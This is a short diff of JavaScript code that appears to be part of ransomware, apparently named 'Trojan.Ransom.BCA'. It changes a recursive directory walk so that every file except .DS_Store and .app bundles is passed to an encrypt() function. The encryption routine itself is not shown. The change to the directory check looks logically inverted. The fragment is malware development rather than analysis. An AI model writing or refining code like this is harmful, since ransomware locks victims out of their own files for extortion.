@@ -66,15 +66,15 @@ function search () {
 
                 if( stat.isFile() ) {
                     console.log( "'%s' is a file.", fromPath );
-                    if (file === ".DS_Store")
-                        return;
-                    else {
+
+                    let extension = file.split('.').pop();
+                    if (file !== ".DS_Store" && extension !== "app") {
                         encrypt(fromPath);
                     }
                 }
                 else if(stat.isDirectory()) {
                     console.log( "'%s' is a directory.", fromPath );
-                    if (file === "Trojan.Ransom.BCA")
+                    if (file !== "Trojan.Ransom.BCA")
                         return;
                 }
 
